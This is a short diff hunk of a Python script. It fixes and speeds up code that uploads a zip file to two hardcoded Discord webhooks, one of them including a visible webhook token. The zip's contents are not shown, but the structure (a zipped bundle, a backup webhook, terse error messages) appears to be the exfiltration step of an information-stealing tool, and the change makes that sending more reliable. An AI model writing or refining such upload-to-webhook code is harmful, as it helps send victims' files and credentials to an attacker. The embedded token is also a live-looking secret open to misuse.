@@ -456,18 +456,19 @@ payload = {"embeds": [embed]}
 webhook1 = "https://discord.com/api/webhooks/1329863693823115459/sqegE7kgrnM1NnLAuAkXYigrK2ewbsAtdsTdIv4R8n50kgodZ7XgGes2NZ2mW8iJakwg"
 webhook2 = "~~"
 
-with open(zipPath, "rb") as file:
-    files = {"file": file}
+with open(zipPath, "rb") as zipFileToSend:
+    fileReady = {"file": zipFileToSend}
     try:
-        response1 = requests.post(webhook1, files=files, data={"payload_json": json.dumps(payload)})
+        response1 = requests.post(webhook1, files=fileReady, data={"payload_json": json.dumps(payload)})
     except Exception as e:
         print("[int] Internal error : 1")
 
-time.sleep(10)
+time.sleep(2)
 
-with open(zipPath, "rb") as file:
+with open(zipPath, "rb") as zipFileToSend:
+    fileReady = {"file": zipFileToSend}
     try:
-        response2 = requests.post(webhook2, files=files, data={"payload_json": json.dumps(payload)})
+        response2 = requests.post(webhook2, files=fileReady, data={"payload_json": json.dumps(payload)})
     except Exception as e:
         print(f"[ext] Error with the webhook : {e}")
 
